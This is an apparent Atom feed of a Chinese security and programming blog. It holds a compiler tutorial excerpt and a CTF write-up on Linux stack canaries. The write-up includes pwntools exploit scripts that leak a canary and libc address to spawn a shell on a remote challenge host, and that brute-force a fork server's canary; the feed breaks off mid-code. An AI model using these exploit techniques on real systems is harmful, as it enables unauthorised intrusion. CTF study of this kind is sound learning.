<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>pz1o</title>
  
  <subtitle>pz1o</subtitle>
  <link href="https://pz1o.top/atom.xml" rel="self"/>
  
  <link href="https://pz1o.top/"/>
  <updated>2020-12-30T16:05:01.181Z</updated>
  <id>https://pz1o.top/</id>
  
  <author>
    <name>pz1o</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Flag</title>
    <link href="https://pz1o.top/2099/09/27/Flag/"/>
    <id>https://pz1o.top/2099/09/27/Flag/</id>
    <published>2099-09-27T15:15:44.000Z</published>
    <updated>2020-12-30T16:05:01.181Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Welcome to my blog, enter password to read.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    
    <summary type="html">Welcome to my blog, enter password to read.</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>写一个编译器</title>
    <link href="https://pz1o.top/2021/02/20/%E5%86%99%E4%B8%80%E4%B8%AA%E7%BC%96%E8%AF%91%E5%99%A8/"/>
    <id>https://pz1o.top/2021/02/20/%E5%86%99%E4%B8%80%E4%B8%AA%E7%BC%96%E8%AF%91%E5%99%A8/</id>
    <published>2021-02-20T14:43:04.000Z</published>
    <updated>2021-02-21T05:58:52.910Z</updated>
    
    <content type="html"><![CDATA[<p>d当有了这个文件夹，我才有动力把它更完。</p><h1 id="0x01-设计"><a href="#0x01-设计" class="headerlink" title="0x01 设计"></a>0x01 设计</h1><h2 id="1-构建流程"><a href="#1-构建流程" class="headerlink" title="1. 构建流程"></a>1. 构建流程</h2><p>有三个步骤</p><ol><li>词法分析器，用于将字符串转化成内部的表示结构。</li><li>语法分析器，将词法分析得到的标记流（token）生成一棵语法树。</li><li>目标代码的生成，将语法树转化成目标代码。</li></ol><p>这里我们的步骤</p><ol><li>构建我们自己的虚拟机以及指令集。这后生成的目标代码便是我们的指令集。</li><li>构建我们的词法分析器</li><li>构建语法分析器</li></ol><h2 id="2-编译器框架"><a href="#2-编译器框架" class="headerlink" title="2. 编译器框架"></a>2. 编译器框架</h2><p>这里有一个单独用于解析“表达式”的函数 <code>expression</code> 是因为表达式在语法分析中相对独立并且比较复杂，所以我们将它单独作为一个模块</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> token;            <span class="comment">// current token</span></span><br><span class="line"><span class="keyword">char</span> *src, *old_src;  <span class="comment">// pointer to source code string;</span></span><br><span class="line"><span class="keyword">int</span> poolsize;         <span class="comment">// default size of text/data/stack</span></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">line</span>;             <span class="comment">// line number</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    token = *src++;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">expression</span><span class="params">(<span class="keyword">int</span> level)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// do nothing</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">program</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    next();                  <span class="comment">// get next token</span></span><br><span class="line">    <span class="keyword">while</span> (token &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"token is: %c\n"</span>, token);</span><br><span class="line">        next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">eval</span><span class="params">()</span> </span>&#123; <span class="comment">// do nothing yet</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, fd;</span><br><span class="line"></span><br><span class="line">    argc--;</span><br><span class="line">    argv++;</span><br><span class="line"></span><br><span class="line">    poolsize = <span class="number">256</span> * <span class="number">1024</span>; <span class="comment">// arbitrary size</span></span><br><span class="line">    <span class="built_in">line</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((fd = <span class="built_in">open</span>(*argv, <span class="number">0</span>)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"could not open(%s)\n"</span>, *argv);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(src = old_src = <span class="built_in">malloc</span>(poolsize))) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"could not malloc(%d) for source area\n"</span>, poolsize);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// read the source file</span></span><br><span class="line">    <span class="keyword">if</span> ((i = <span class="built_in">read</span>(fd, src, poolsize<span class="number">-1</span>)) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"read() returned %d\n"</span>, i);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    src[i] = <span class="number">0</span>; <span class="comment">// add EOF character</span></span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line"></span><br><span class="line">    program();</span><br><span class="line">    <span class="keyword">return</span> eval();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><ol><li><code>next()</code> 用于词法分析，获取下一个标记，它将自动忽略空白字符。</li><li><code>program()</code> 语法分析的入口，分析整个 C 语言程序。</li><li><code>expression(level)</code> 用于解析一个表达式。</li><li><code>eval()</code> 虚拟机的入口，用于解释目标代码。</li></ol></blockquote><p>上面代码主要是逐字读取，并输出，接下来我们具体实现每个函数功能。</p><h1 id="0x02-虚拟机"><a href="#0x02-虚拟机" class="headerlink" title="0x02 虚拟机"></a>0x02 虚拟机</h1><p>在计算机中，我们主要关心，内存，CPU，寄存器。</p><p>代码（汇编指令）以二进制的形式保存在内存中；CPU 从中一条条地加载指令执行；程序运行的状态保存在寄存器中。</p><h2 id="1-内存"><a href="#1-内存" class="headerlink" title="1. 内存"></a>1. 内存</h2><p>内存用于存储数据，这里的数据可以是代码，也可以是其它的数据。</p><p>32 位的机器中，我们可以使用的内存地址为 <code>2^32 = 4G</code></p><p>内存中有几个段，在前面程序员自我修养中已经讲过了</p><ol><li>代码段（text）用于存放代码（指令）。</li><li>数据段（data）用于存放初始化了的数据，如<code>int i = 10;</code>，就需要存放到数据段中。</li><li>未初始化数据段（bss）用于存放未初始化的数据，如 <code>int i[1000];</code>，因为不关心其中的真正数值，所以单独存放可以节省空间，减少程序的体积。</li><li>栈（stack）用于处理函数调用相关的数据，如调用帧（calling frame）或是函数的局部变量等。</li><li>堆（heap）用于为程序动态分配内存。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;d当有了这个文件夹，我才有动力把它更完。&lt;/p&gt;
&lt;h1 id=&quot;0x01-设计&quot;&gt;&lt;a href=&quot;#0x01-设计&quot; class=&quot;headerlink&quot; title=&quot;0x01 设计&quot;&gt;&lt;/a&gt;0x01 设计&lt;/h1&gt;&lt;h2 id=&quot;1-构建流程&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    
    <category term="编译器" scheme="https://pz1o.top/tags/%E7%BC%96%E8%AF%91%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>Linux安全机制</title>
    <link href="https://pz1o.top/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/"/>
    <id>https://pz1o.top/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/</id>
    <published>2021-02-19T08:21:57.000Z</published>
    <updated>2021-02-22T13:13:33.355Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-Canary"><a href="#0x01-Canary" class="headerlink" title="0x01 Canary"></a>0x01 Canary</h1><p>Canary 的意思是金丝雀,是一种用于对抗栈溢出攻击的技术，也叫做cookies。Cannry是栈上的一个随机数，在程序启动时随机生成并保存在比函数返回地址更低的位置。由于栈溢出时从低地址到高地址，因此想要攻击成功必须覆盖cannry。</p><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h2><p>Cannries分为三类，分别是<code>terminator</code> <code>random</code> <code>random XOR</code></p><ul><li><code>Terminator canaries</code>：由于许多栈溢出都是由于字符串操作不当造成的，也就是最后会以<code>\x00</code>结尾，其实是被截断。所以<code>Terminator canaries</code>将地位设置为<code>\x00</code>。此外还有截断字符CR(0x0d)、LF(0x0a)、EOF(0xff)</li><li><code>Random canaries</code>：这个通常在程序初始化时随机生成出来，由<code>/dev/urandom</code>生成</li><li><code>Random XOR canaries</code>：与上一个相同，但多了异或操作，相比上一个更难操作。</li></ul><p>gcc参数开启canary</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="line">-fstack-protector-strong</span><br><span class="line">-fstack-protector-explicit 只对有明确 stack_protect attribute 的函数开启保护</span><br><span class="line">-fno-stack-protector 禁用保护</span><br></pre></td></tr></table></figure><h2 id="2-演示"><a href="#2-演示" class="headerlink" title="2. 演示"></a>2. 演示</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">char buf[10];</span><br><span class="line">scanf(&quot;%s&quot;,buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ gcc -fstack-protector b.c -o b</span><br></pre></td></tr></table></figure><p><img src="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210220150601689.png" alt="image-20210220150601689"></p><p>出现错误</p><p>看汇编</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disassemble main</span><br></pre></td></tr></table></figure><p><img src="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210220150909813.png" alt="image-20210220150909813"></p><blockquote><p>看两处红框地方，我们可以知道是把一些东西放到rax中，之后又把rax中异或跳转。</p><p>1.fs寄存器是什么？</p><p>fs寄存器被用于存放线程局部存储(Thread Local Stroage,TLS)。TLS是为了避免多个线程同时访问同一全局变量或静态变量所导致的冲突。TLS为每一个使用全局变量的线程提供一个变量值的副本。从全局变量角度看，就是全局变量被克隆了多个副本，每一个副本都可以被一个线程独立改变。而0x28就是stack_guard</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;typedef struct</span><br><span class="line">&gt;&#123;</span><br><span class="line"> void *tcb;        &#x2F;* Pointer to the TCB.  Not necessarily the</span><br><span class="line">                      thread descriptor used by libpthread.  *&#x2F;</span><br><span class="line"> dtv_t *dtv;</span><br><span class="line"> void *self;       &#x2F;* Pointer to the thread descriptor.  *&#x2F;</span><br><span class="line"> int multiple_threads;</span><br><span class="line"> uintptr_t sysinfo;</span><br><span class="line"> uintptr_t stack_guard;</span><br><span class="line"> ...</span><br><span class="line">&gt;&#125; tcbhead_t;</span><br></pre></td></tr></table></figure></blockquote><p>事实上，TLS 中的值由函数 security_init 进行初始化。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">security_init (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// _dl_random的值在进入这个函数的时候就已经由kernel写入.</span></span><br><span class="line">  <span class="comment">// glibc直接使用了_dl_random的值并没有给赋值</span></span><br><span class="line">  <span class="comment">// 如果不采用这种模式, glibc也可以自己产生随机数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//将_dl_random的最后一个字节设置为0x0</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置Canary的值到TLS中</span></span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//THREAD_SET_STACK_GUARD宏用于设置TLS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span></span><br><span class="line">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></pre></td></tr></table></figure><p><img src="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/2.png" alt="img"></p><h2 id="3-攻击"><a href="#3-攻击" class="headerlink" title="3. 攻击"></a>3. 攻击</h2><p>攻击有两种思路</p><ol><li>第一种就是泄露canary，然后覆盖</li><li>第二种是同时篡改TLS和栈上的Canary从而绕过检查</li></ol><p>只能一次操作的通常是劫持got表，多次操作的泄露canary</p><h2 id="3-1-泄露栈中的-Canary"><a href="#3-1-泄露栈中的-Canary" class="headerlink" title="3.1 泄露栈中的 Canary"></a>3.1 泄露栈中的 Canary</h2><p>有些存在溢出漏洞的程序，在要求我们输入字符后，会将我们输入的字符打印出来，而canary的最低位是\x00，是为了让canary可以截断输入的字符。我们可以利用溢出，多覆盖一个字节，将\x00给覆盖掉，那么canary就会和我们输入的字符连起来，那么，程序打印时没有检查打印字符的长度的话，就可以连带着Canary打印出来了，然后再次溢出，将泄露出的canary填入原来的位置，就可以覆盖到返回地址了</p><h3 id="1-（攻防世界）厦门邀请赛pwn1"><a href="#1-（攻防世界）厦门邀请赛pwn1" class="headerlink" title="1.（攻防世界）厦门邀请赛pwn1"></a>1.（攻防世界）厦门邀请赛pwn1</h3><p>说一下这个题的思路把</p><ol><li>利用read泄露canary</li><li>64位puts泄露基址</li><li>one_gagdet直接shell</li></ol><p>说一下我的难点</p><blockquote><p>1.第一次做这个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;canary &#x3D; u64(r(7).rjust(8,&#39;\x00&#39;)) </span><br></pre></td></tr></table></figure><p>要明白是右对齐，也可以这样写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;canary &#x3D; u64(r(8))-0xa</span><br></pre></td></tr></table></figure><p>具体就是上面讲的原理</p><p>2.sl()和s()区别</p><p>sl()会多发一个’\n’</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line"><span class="comment">#ontext.log_level='debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./babystack"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.232.so"</span>)</span><br><span class="line">p = remote(<span class="string">"111.200.241.244"</span>,<span class="number">41155</span>)</span><br><span class="line"><span class="comment">#p = process("./babystack")</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400a93</span></span><br><span class="line">puts_plt = elf.sym[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">main = <span class="number">0x400908</span></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x88</span> </span><br><span class="line">sla(<span class="string">'&gt;&gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x4009DD')</span></span><br><span class="line">sla(<span class="string">'&gt;&gt; '</span>,<span class="string">'2'</span>)</span><br><span class="line">ru(<span class="string">b'A'</span>*<span class="number">0x88</span>+<span class="string">'\n'</span>)</span><br><span class="line">canary = u64(r(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">'\x00'</span>))  </span><br><span class="line">leak(<span class="string">"canary"</span>,canary)</span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x88</span> + p64(canary) + <span class="string">b'A'</span>*<span class="number">8</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">sla(<span class="string">"&gt;&gt; "</span>,<span class="string">'1'</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">sla(<span class="string">"&gt;&gt; "</span>,<span class="string">'3'</span>)</span><br><span class="line">puts = uu64(r(<span class="number">8</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">leak(<span class="string">'puts'</span>,puts)</span><br><span class="line">libc_base = puts - libc.sym[<span class="string">"puts"</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x45216</span></span><br><span class="line">leak(<span class="string">'libc'</span>,libc_base)</span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x88</span> + p64(canary) + <span class="string">b'A'</span>*<span class="number">8</span> + p64(one_gadget)</span><br><span class="line">sla(<span class="string">"&gt;&gt; "</span>,<span class="string">'1'</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">sla(<span class="string">"&gt;&gt; "</span>,<span class="string">'3'</span>)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="3-2Fork子进程程序爆破canary"><a href="#3-2Fork子进程程序爆破canary" class="headerlink" title="3.2Fork子进程程序爆破canary"></a>3.2Fork子进程程序爆破canary</h2><h3 id="NJCTF2017（messager）"><a href="#NJCTF2017（messager）" class="headerlink" title="NJCTF2017（messager）"></a>NJCTF2017（messager）</h3><p>看一下这个题</p><p><img src="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210221155807161.png" alt="image-20210221155807161"></p><p>函数主要逻辑是将flag从文件里取出，然后放到bss段，同时开通了一个socket发送flag函数send，目的就是控制这个函数</p><p>此外，这个主进程每次还会fork一个子进程，让用户与400BE9进行交互</p><p><img src="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210221155843764.png" alt="image-20210221155843764"></p><p>sub_400BE9函数里有栈溢出</p><blockquote><p>Fork函数创建子进程相当于复制一份当前进程，并且其中的内存布局以及变量等，包括canary都与父进程一致</p><p>通常情况下，我们爆破canary是不可能的，但由于同一个进程内复刻的子进程，它们的canaries是不变的，且子进程崩溃不会影响到主进程，这就给了我们爆破的机会</p><p>爆破是逐字节进行的，根据进程崩溃与否来判断填上去的字符串是否正确。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_canary</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> canary</span><br><span class="line">    canary = <span class="string">"\x00"</span></span><br><span class="line">    <span class="keyword">while</span> len(canary) &lt; <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">256</span>):</span><br><span class="line">            p = process(<span class="string">"./messager"</span>)</span><br><span class="line">            p.recv()</span><br><span class="line">            p.send(<span class="string">"A"</span>*<span class="number">104</span> + canary + chr(i))</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                p.recv()</span><br><span class="line">                canary +=chr(x)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                p.close()</span><br><span class="line">    leak(<span class="string">"canary"</span>,canary)</span><br><span class="line">leak_canary()</span><br><span class="line">p = process(<span class="string">"./messager"</span>)</span><br><span class="line">p.recv()</span><br><span class="line">s(<span class="string">"A"</span>*<span class="number">104</span>+canary+<span class="string">"A"</span>*<span class="number">8</span>+p64(<span class="number">0x400bc6</span>))</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h3 id="fork中getshell"><a href="#fork中getshell" class="headerlink" title="fork中getshell"></a>fork中getshell</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 